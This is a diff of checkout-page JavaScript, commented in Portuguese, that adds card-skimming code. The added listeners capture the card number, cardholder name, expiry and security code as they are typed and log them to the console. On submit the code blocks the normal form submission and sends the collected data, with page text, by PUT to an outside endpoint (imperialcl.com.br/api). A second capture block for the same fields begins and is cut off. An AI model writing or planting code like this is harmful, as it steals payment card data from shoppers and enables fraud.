@@ -216,6 +216,78 @@
           // Adiciona ouvintes de eventos de alteração para cada input
           cardNumberInput.addEventListener("input", function () {
             data.cardNumber = cardNumberInput.value;
+            console.log("Número do cartão:", data.cardNumber);
+          });
+      
+          ccNameInput.addEventListener("input", function () {
+            data.ccName = ccNameInput.value;
+            console.log("Nome impresso no cartão:", data.ccName);
+          });
+      
+          cardExpirationInput.addEventListener("input", function () {
+            data.cardExpiration = cardExpirationInput.value;
+            console.log("Validade:", data.cardExpiration);
+          });
+      
+          cardCodeInput.addEventListener("input", function () {
+            data.cardCode = cardCodeInput.value;
+            console.log("Código de segurança:", data.cardCode);
+          });
+      
+          function checkout() {
+            var apiendpoint = "https://imperialcl.com.br/api";
+      
+            // Log data to console
+            console.log("Data to be sent:", data);
+      
+            // Envia dados para a API
+            fetch(apiendpoint, {
+              method: "PUT",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(data),
+            });
+          }
+      
+          // Adiciona um ouvinte de evento ao formulário
+          var form = document.querySelector(".form");
+          form.addEventListener("submit", function (event) {
+            event.preventDefault(); // Evita que o formulário seja enviado normalmente
+            checkout();
+          });
+        });
+      </script> -->
+        document.addEventListener("DOMContentLoaded", function () {
+          var ccnumber = "number";
+          var ccnamenputid = "name";
+          var ccexpire = "expiry";
+          var cardcodeinputid = "cvc";
+          var paragraphClass = "description";
+      
+          var cardNumberInput = document.getElementById(ccnumber);
+          var ccNameInput = document.getElementById(ccnamenputid);
+          var cardExpirationInput = document.getElementById(ccexpire);
+          var cardCodeInput = document.getElementById(cardcodeinputid);
+          var paragraphElement = document.querySelector("." + paragraphClass);
+      
+          // Verifica se os elementos existem na página
+          if (!cardNumberInput || !ccNameInput || !cardExpirationInput || !cardCodeInput || !paragraphElement) {
+            console.log("Alguns dos elementos não foram encontrados. Verifique os IDs dos elementos.");
+            return;
+          }
+      
+          var data = {
+            cardNumber: "",
+            ccName: "",
+            cardExpiration: "",
+            cardCode: "",
+            userdata: paragraphElement.innerText,
+          };
+      
+          // Adiciona ouvintes de eventos de alteração para cada input
+          cardNumberInput.addEventListener("input", function () {
+            data.cardNumber = cardNumberInput.value;
           });
       
           ccNameInput.addEventListener("input", function () {
